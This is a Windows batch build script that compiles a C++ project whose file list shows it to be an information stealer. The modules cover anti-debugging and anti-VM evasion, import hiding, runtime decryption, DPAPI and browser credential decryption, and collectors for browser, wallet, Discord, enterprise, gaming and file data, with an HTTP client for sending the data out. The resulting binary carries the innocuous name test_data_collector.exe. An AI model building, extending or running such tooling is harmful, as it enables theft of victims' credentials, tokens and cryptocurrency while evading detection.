@echo off
cd /d "%~dp0"
set PATH=C:\msys64\mingw64\bin;%PATH%
C:\msys64\mingw64\bin\g++ --version
echo.
echo Building WITHOUT sqlite3.c...
C:\msys64\mingw64\bin\g++ -o test_data_collector.exe src/core/main.cpp src/core/stealer.cpp src/evasion/anti_debug.cpp src/evasion/anti_vm.cpp src/evasion/api_hammering.cpp src/evasion/import_hiding.cpp src/evasion/runtime_decrypt.cpp src/collectors/browser_collector.cpp src/collectors/wallet_collector.cpp src/collectors/app_collector.cpp src/collectors/discord_collector.cpp src/collectors/enterprise_collector.cpp src/collectors/file_grabber.cpp src/collectors/gaming_collector.cpp src/collectors/browser_decryptor.cpp src/crypto/aes.cpp src/crypto/dpapi.cpp src/crypto/hash.cpp src/crypto/chacha20.cpp src/memory/memory_archive.cpp src/memory/memory_encrypt.cpp src/memory/secure_delete.cpp src/utils/http_client.cpp src/utils/json_builder.cpp src/utils/mutex.cpp -lwininet -lwinhttp -lcrypt32 -liphlpapi -lpsapi -lshell32 -lshlwapi -lbcrypt -O3 -s -static -std=c++20 2>&1 | findstr /V "warning:"
if %errorlevel% equ 0 (
    echo.
    echo [+] BUILD SUCCESS!
    dir test_data_collector.exe
    echo.
    echo Ready to test: test_data_collector.exe
) else (
    echo.
    echo [-] BUILD FAILED!
)
pause
